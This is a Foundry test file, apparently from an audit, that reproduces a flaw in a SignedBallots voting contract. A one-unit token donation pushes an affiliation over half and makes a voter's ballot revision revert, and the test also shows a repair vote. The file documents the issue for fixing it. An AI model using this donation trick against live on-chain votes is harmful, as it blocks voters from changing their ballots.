// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Copy into vote/test/ to run against the audited source and fixtures.
import {Fixture, MockToken} from "./helpers/Fixtures.sol";
import {SignedBallots} from "../contracts/SignedBallots.sol";

contract SettledDonationReproduction is Fixture {
    function test_donationStrandsAnUnchangedSettledPrefix() public {
        MockToken usd = new MockToken(6);
        ballots.registerCurrency(address(usd), address(0));
        ballots.addGroup(bytes32("Affiliation"));
        ballots.setInitiative(0, INITIATIVE_A, 100_000e6, false, 1);
        ballots.setInitiative(1, INITIATIVE_B, 50_000e6, false, 0);
        ballots.setInitiative(2, INITIATIVE_C, 50_000e6, false, 0);
        ballots.setInitiative(3, INITIATIVE_D, 100_000e6, false, 0);
        ballots.addInitiative(address(0xA05), 100_000e6, false, 0);
        ballots.setPoolUsd(300_000e6);
        bytes memory initial = hex"0101010405";
        bytes memory revision = hex"0101010504";
        uint8[] memory proof = proofOf(initial);
        vm.warp(start);
        vm.prank(alice);
        ballots.vote(1, 1, initial, proof);
        // No intervening event: replay settles S-Tier at its first window end.
        vm.warp(ballots.firstTallyAt(0) + ballots.initialWindow() + 1);
        // A third party transfers one unit of the fixed-price token to a different
        // S-Tier project. The attacked affiliation rises from 50% to over 50%.
        address donor = address(0xD010);
        usd.mint(donor, 1e6);
        vm.prank(donor);
        usd.transfer(INITIATIVE_B, 1e6);
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSelector(SignedBallots.GroupOverHalf.selector, uint8(0), uint8(0)));
        ballots.vote(1, 2, revision, proof);
        assertEq(ballots.nonceOf(1), 1);
        // Expanding S-Tier repairs concentration on-chain, but the accompanying
        // TypeScript probe proves replay rejects this settled-prefix change.
        bytes memory repair = hex"0101010105";
        vm.prank(alice);
        ballots.vote(1, 2, repair, proof);
        assertEq(ballots.nonceOf(1), 2);
    }
}
